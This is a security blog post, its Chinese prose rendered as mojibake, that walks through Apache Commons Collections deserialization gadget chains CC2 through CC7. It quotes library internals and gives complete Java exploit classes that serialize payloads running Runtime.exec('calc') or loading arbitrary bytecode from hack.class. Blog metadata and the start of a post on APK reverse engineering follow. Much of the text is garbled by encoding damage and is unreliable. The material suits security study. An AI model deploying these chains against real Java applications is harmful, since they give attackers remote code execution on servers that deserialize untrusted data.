CC6ä¸CC1çš„åŒºåˆ«åœ¨äºå…¥å£ç‚¹å¤„å‘ç”Ÿæ”¹å˜ï¼Œåé¢ä»LazyMapå¼€å§‹éƒ½æ˜¯ä¸€æ ·çš„ã€‚ æ³¨æ„åˆ°TiedMapEntryç±»ä¸­ï¼ŒhashCodeæ–¹æ³•è°ƒç”¨äº†getValueï¼ŒgetValueè°ƒç”¨äº†getå‡½æ•°ï¼Œè¾¾åˆ°LazyMapçš„getæ–¹æ³•è°ƒç”¨ã€‚TiedMapEntryç±»ä¸»è¦ä»£ç å¦‚ä¸‹ 12345678910111213141516public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key; &#125; public Object getValue() &#123; return map.get(key); &#125; public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;&#125; è€ŒHashMapç±»ä¸­ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨hashCodeï¼Œå¯ä»¥å‚è€ƒURLDNSé“¾æ¥å®Œæˆå…¥å£ç‚¹å¤„ã€‚HashMapç±»ä¸»è¦ä»£ç ï¼š 1234567891011121314151617public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable &#123; static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; ...; if (...) &#123; for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; è¿›è€Œå¯ä»¥ç¼–å†™CC6è°ƒç”¨é“¾ï¼Œå…¶ä¸­lazyMap.remove(â€œaaaâ€)æ˜¯å› ä¸ºputæ–¹æ³•ä¼šè°ƒç”¨HashCodeï¼Œå°†aaaå€¼æ’å…¥åˆ°LazyMapï¼Œå¯¼è‡´ååºåˆ—åŒ–æ— æ³•æ­£å¸¸è°ƒç”¨ï¼Œåå°„æ›´æ”¹factoryæ˜¯ä¸ºäº†é˜²æ­¢å‘½ä»¤åœ¨æœ¬åœ°æ‰§è¡Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(&quot;ccc&quot;)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); HashMap&lt;Object, Object&gt; o = new HashMap&lt;&gt;(); o.put(tiedMapEntry, &quot;bbb&quot;); lazyMap.remove(&quot;aaa&quot;); Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class; Field factory = lazyMapClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap, chainedTransformer); serialize(o); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; CC3è¿˜æ˜¯åœ¨CC1çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›ï¼ŒCC1é“¾ä¸­åªèƒ½é€šè¿‡åå°„æ¥è°ƒç”¨å‘½ä»¤ï¼ŒCC3ä¸­å¼•å…¥äº†TemplatesImplç±»è¿›è¡Œä»»æ„ç±»åŠ è½½è°ƒç”¨é™æ€ä»£ç å—ï¼Œå»é™¤äº†ä¸€äº›é™åˆ¶ã€‚å…ˆçœ‹ä¸€ä¸‹TemplatesImplç±» 12345678910111213141516171819202122232425262728293031323334353637383940public final class TemplatesImpl implements Templates, Serializable &#123; private static String ABSTRACT_TRANSLET = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; private String _name = null; private byte[][] _bytecodes = null; private Class[] _class = null; private int _transletIndex = -1; private transient Map&lt;String, Class&lt;?&gt;&gt; _auxClasses = null; private transient TransformerFactoryImpl _tfactory = null; public TemplatesImpl() &#123; &#125; private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (...Exception e) &#123; throw new ...Exception(err.toString()); &#125; &#125; public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer; &#125;&#125; TrAXFilterç±»ä¸­çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨äº†newTransformeræ–¹æ³• 123456789101112public class TrAXFilter extends XMLFilterImpl &#123; private Templates _templates; private TransformerImpl _transformer; private TransformerHandlerImpl _transformerHandler; private boolean _useServicesMechanism = true; public TrAXFilter(Templates templates) throws TransformerConfigurationException &#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism(); &#125;&#125; çœ‹èµ·æ¥å·²ç»å¯ä»¥å®Œæˆè¿™æ¡é“¾äº†ï¼Œä½†æ˜¯CC3ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„Transformerç±»ï¼šInstantiateTransformerï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åå°„è°ƒç”¨ä¸€ä¸ªç±»çš„æ„é€ å‡½æ•°å¹¶æ‰§è¡Œï¼Œä¸»è¦ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415public class InstantiateTransformer implements Transformer, Serializable &#123; private final Class[] iParamTypes; private final Object[] iArgs; public Object transform(Object input) &#123; try &#123; if (input instanceof Class == false) &#123; throw new FunctorException(...); &#125; Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); &#125; catch (...Exception ex) &#123; throw new ...Exception(&quot;...&quot;, ex); &#125; &#125;&#125; äºæ˜¯å¯ä»¥å®ŒæˆCC3é“¾çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class CC3 &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates, &quot;foo&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;hack.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;, &quot;value&quot;); Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Constructor&lt;?&gt; declaredConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o = declaredConstructor.newInstance(Retention.class, transformedMap); serialize(o); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; CC4ä»CC4å¼€å§‹ï¼Œè¿›å…¥åˆ°commons collections4çš„ç¯å¢ƒä¸­ CC4è°ƒç”¨é“¾çš„ååŠéƒ¨åˆ†ä¸CC3æ— å¤§è‡´å·®åˆ«ï¼Œä¾æ—§æ˜¯ChainedTransformerè°ƒç”¨InstantiateTransformeræ¥åŠ è½½ä»£ç ã€‚ åœ¨TransformingComparatorç±»ä¸­compareæ–¹æ³•ä¸­è°ƒç”¨äº†transformå‡½æ•° 12345678910111213141516public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123; private final Comparator&lt;O&gt; decorated; private final Transformer&lt;? super I, ? extends O&gt; transformer; public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer) &#123; this(transformer, ComparatorUtils.NATURAL_COMPARATOR); &#125; public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer, final Comparator&lt;O&gt; decorated) &#123; this.decorated = decorated; this.transformer = transformer; &#125; public int compare(final I obj1, final I obj2) &#123; final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125;&#125; æ¥ç€ä½¿ç”¨PriorityQueueçš„siftDownUsingComparatoræ–¹æ³•è°ƒç”¨compareå‡½æ•°ï¼Œæ°å¥½ä¸­PriorityQueueçš„readObjectæ–¹æ³•è°ƒç”¨heapifyå†è°ƒç”¨siftDownæœ€åå¯ä»¥èµ°åˆ°siftDownUsingComparatoræ–¹æ³• 12345678910111213141516171819202122232425262728293031323334353637383940414243public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123; public PriorityQueue(Comparator&lt;? super E&gt; comparator) &#123; this(DEFAULT_INITIAL_CAPACITY, comparator); &#125; public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator; &#125; private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; private void readObject(java.io.ObjectInputStream s) throws ...Exception &#123; s.defaultReadObject(); s.readInt(); queue = new Object[size]; for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); heapify(); &#125; è¿›è€Œå†™å‡ºCC4ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class CC4 &#123; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates, &quot;foo&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;hack.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer&lt;&gt;(transformers); TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class&lt;? extends TransformingComparator&gt; c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator, chainedTransformer); serialize(priorityQueue); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; CC2å’ŒCC4æ¯”è¾ƒç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯èˆå»äº†ChainedTransformerå’ŒInstantiateTransformerï¼Œè€Œé‡‡ç”¨InvokerTransformerç›´æ¥å¯¹TemplatesImplè°ƒç”¨newTransformerï¼ˆå› ä¸ºtransformæ¥æ”¶çš„å‚æ•°å¯æ§ï¼‰ è¿™é‡Œç›´æ¥ç»™å‡ºä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344public class CC2 &#123; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates, &quot;foo&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;hack.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;); TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class&lt;? extends TransformingComparator&gt; c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator, invokerTransformer); serialize(priorityQueue); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; CC5cc5å’Œcc7é“¾åˆå›åˆ°äº†Commons Collections&lt;&#x3D;3.2.1çš„èŒƒå›´ CC5å’ŒCC1ã€CC3çš„åŒºåˆ«æ˜¯ä¸å†å€ŸåŠ© AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘è€Œæ˜¯é€šè¿‡TiedMapEntryçš„toStringæ–¹æ³•è°ƒç”¨LazyMapçš„getæ–¹æ³• 12345678public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123; private final Map map; public Object getValue() &#123; return map.get(key); &#125; public String toString() &#123; return getKey() + &quot;=&quot; + getValue(); &#125; æ¥ç€é€šè¿‡BadAttributeValueExpExceptionç±»çš„readObjectæ–¹æ³•è°ƒç”¨TiedMapEntryçš„toStringæ–¹æ³•å®Œæˆè°ƒç”¨ 123456789101112131415161718192021222324252627public class BadAttributeValueExpException extends Exception &#123; private Object val; public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); &#125; &#125;&#125; æœ€ç»ˆå®ç°ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334public class CC5 &#123; public static void main(String[] args) throws Throwable &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map lazyMap = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Field val = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); serialize(badAttributeValueExpException); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; CC7CC7é“¾ååŠæ®µä¸CC1ã€CC5ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯é€šè¿‡AbstractMapçš„equalsæ–¹æ³•æ¥è°ƒç”¨LazyMapçš„getï¼Œå†ç”¨Hashtableçš„reconstitutionPutæ–¹æ³•è°ƒç”¨equalsï¼ŒHashtableå…³é”®ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435public class Hashtable&lt;K,V&gt; extends Dictionary&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, java.io.Serializable &#123; private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; s.defaultReadObject(); int origlength = s.readInt(); int elements = s.readInt(); int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length &gt; elements &amp;&amp; (length &amp; 1) == 0) length--; if (origlength &gt; 0 &amp;&amp; length &gt; origlength) length = origlength; table = new Entry&lt;?,?&gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; for (; elements &gt; 0; elements--) &#123; K key = (K)s.readObject(); V value = (V)s.readObject(); reconstitutionPut(table, key, value); &#125; &#125; private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value) throws StreamCorruptedException &#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++; &#125;&#125; æ³¨æ„åˆ°e.hash &#x3D;&#x3D; hashçš„åˆ¤æ–­ï¼Œå› æ­¤éœ€è¦å¯¹ä¸¤ä¸ªè¾“å…¥å¯¹è±¡è¿›è¡Œå“ˆå¸Œç¢°æ’ï¼Œåœ¨Javaä¸­å­˜åœ¨ä¸€ä¸ªâ€yyâ€ä¸â€zZâ€çš„å“ˆå¸Œç¢°æ’ï¼Œäºæ˜¯å¯ä»¥é¡ºåˆ©å†™å‡ºè°ƒç”¨é“¾ï¼Œå…¶ä¸­lazyMap0.remove(â€œyyâ€)æ˜¯å› ä¸ºåˆ¤æ–­yyæ˜¯å¦å­˜åœ¨åä¼šå‘lazyMap0æ·»åŠ ä¸€ä¸ªyyçš„é”®ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940public class CC7 &#123; public static void main(String[] args) throws Exception&#123; Transformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;); Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); HashMap&lt;Object, Object&gt; map0 = new HashMap&lt;&gt;(); Map lazyMap = LazyMap.decorate(map, chainedTransformer); lazyMap.put(&quot;yy&quot;, 1); Map lazyMap0 = LazyMap.decorate(map0, chainedTransformer); lazyMap0.put(&quot;zZ&quot;, 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap, 1); hashtable.put(lazyMap0, 2); Field iTransformersField = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;); iTransformersField.setAccessible(true); iTransformersField.set(chainedTransformer, transformers); lazyMap0.remove(&quot;yy&quot;); serialize(hashtable); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; æ€»ç»“ä¸€å¼ å›¾æ¥æ¦‚æ‹¬","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://blog.lazyforever.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Javaå®‰å…¨","slug":"Javaå®‰å…¨","permalink":"https://blog.lazyforever.top/tags/Java%E5%AE%89%E5%85%A8/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://blog.lazyforever.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CCé“¾","slug":"CCé“¾","permalink":"https://blog.lazyforever.top/tags/CC%E9%93%BE/"}]},{"title":"è®°ä¸€æ¬¡é›¶åŸºç¡€IOTè®¾å¤‡ä¸appäº¤äº’0dayæ¼æ´æŒ–æ˜å­¦ä¹ ç»å†","slug":"2023apkreverse","date":"2023-12-12T02:00:20.000Z","updated":"2023-12-12T16:06:48.668Z","comments":true,"path":"2023/12/12/2023apkreverse/","link":"","permalink":"https://blog.lazyforever.top/2023/12/12/2023apkreverse/","excerpt":"","text":"åŸºç¡€çŸ¥è¯†apkç»“æ„apkæ˜¯å¯¹ä¸€ä¸ªå®‰å“åº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„æ–‡ä»¶è¿›è¡Œæ‰“åŒ…ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¢«ç­¾åçš„å‹ç¼©åŒ…ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œapkä¼šå«æœ‰ä»¥ä¸‹æ–‡ä»¶ï¼š assetæ–‡ä»¶å¤¹ï¼šæ˜¯ä¸éœ€ç¼–è¯‘çš„åŸå§‹èµ„æºç›®å½•ï¼ŒåŒ…å«å„ç§é™æ€çš„èµ„æºï¼Œå¦‚å„ç§é…ç½®æ–‡ä»¶ã€JavaScriptã€å­—ä½“æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ç­‰ã€‚ libæ–‡ä»¶å¤¹ï¼šåŠ¨æ€é“¾æ¥åº“å­˜æ”¾çš„ä½ç½®ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹å†…éƒ¨ä»¥ä¸åŒå¤„ç†å™¨ç‰ˆæœ¬è¿˜ä¼šåˆ’åˆ†æˆå¤šä¸ªæ–‡ä»¶å¤¹ï¼Œå¦‚armeabiã€armeabi-v7aã€x86ç­‰ï¼Œå…¶å­˜æ”¾çš„æ–‡ä»¶é€šå¸¸ä¸ºAndroid Nativeçš„ä»£ç ã€‚ META-INFæ–‡ä»¶å¤¹ï¼šç”¨æ¥å­˜æ”¾ç­¾åä¿¡æ¯ï¼Œé€šå¸¸ä¼šæœ‰CERT.RSAã€CERT.SFå’ŒMANIFEST.MFä¸‰ä¸ªæ–‡ä»¶ã€‚æ˜¯ç”¨æ¥ä¿æŠ¤apkçš„æ‰€æœ‰æƒå’Œé˜²æ­¢apkè¢«æ¶æ„ç¯¡æ”¹ã€‚ ræ–‡ä»¶å¤¹&#x2F;resæ–‡ä»¶å¤¹ï¼šå­˜æ”¾ç¼–è¯‘èµ„æºæ–‡ä»¶ï¼Œä¸assetæ–‡ä»¶å¤¹ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯å…¶å­˜æ”¾çš„æ–‡ä»¶æ˜¯ç¼–è¯‘åçš„ã€‚é€šå¸¸ä¼šåŒ…å«drawable æ–‡ä»¶å¤¹ï¼ˆå›¾ç‰‡èµ„æºæ–‡ä»¶ï¼‰ã€layout æ–‡ä»¶å¤¹ï¼ˆå¸ƒå±€æ–‡ä»¶ï¼‰å’Œvalues æ–‡ä»¶å¤¹ï¼ˆå€¼èµ„æºæ–‡ä»¶ï¼‰ç­‰ã€‚ræ–‡ä»¶å¤¹é€šå¸¸æ˜¯resæ–‡ä»¶å¤¹è¿›è¡Œæ··æ·†åçš„ç»“æœã€‚ AndroidManifest.xmlæ–‡ä»¶ï¼šapkçš„æ•´ä½“é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªapkçš„å„ç§é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŒ…åã€åº”ç”¨åã€æƒé™ã€å®‰å“å››å¤§ç»„ä»¶ã€ç‰ˆæœ¬ç­‰é‡è¦ä¿¡æ¯ã€‚ dexæ–‡ä»¶ï¼šå­˜æ”¾å­—èŠ‚ç çš„æ–‡ä»¶ï¼Œå…¶åæ±‡ç¼–åä¸ºsmaliè¯­è¨€ï¼Œå¯è½¬åŒ–ä¸ºJavaä»£ç ï¼Œé€šå¸¸dexæ–‡ä»¶åŒ…å«ä¸€ä¸ªapkçš„ä¸»è¦é€»è¾‘ã€‚ resources.arscæ–‡ä»¶ï¼šç”¨æ¥å­˜æ”¾åº”ç”¨ç¨‹åºçš„èµ„æºè¡¨ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„èµ„æº ID å’Œèµ„æºç±»å‹çš„æ˜ å°„å…³ç³»ã€‚ ä½¿ç”¨å·¥å…·jadx&#x2F;jebï¼šå‡ä¸ºAndroidç¨‹åºJavaå±‚åç¼–è¯‘è½¯ä»¶ï¼Œç›¸å¯¹æ¥è¯´jebåç¼–è¯‘èƒ½åŠ›ç›¸å¯¹è¾ƒå¼ºï¼Œå¯ä»¥çœ‹åˆ°smaliå±‚çš„ä»£ç ï¼Œè€Œä¸”ä¹Ÿæœ‰ä¸€äº›æ··æ·†å¯¹æŠ—çš„èƒ½åŠ› fridaï¼šAndroidç¨‹åºäºŒè¿›åˆ¶åŠ¨æ€æ’æ¡©å·¥å…·ï¼Œç”¨æ¥åŠ¨æ€è°ƒè¯•Androidç¨‹åº xposedï¼šåŠ¨æ€è°ƒè¯•æ’ä»¶ï¼Œç›¸å¯¹äºfridaæ›´åŠ ç¨³å®š 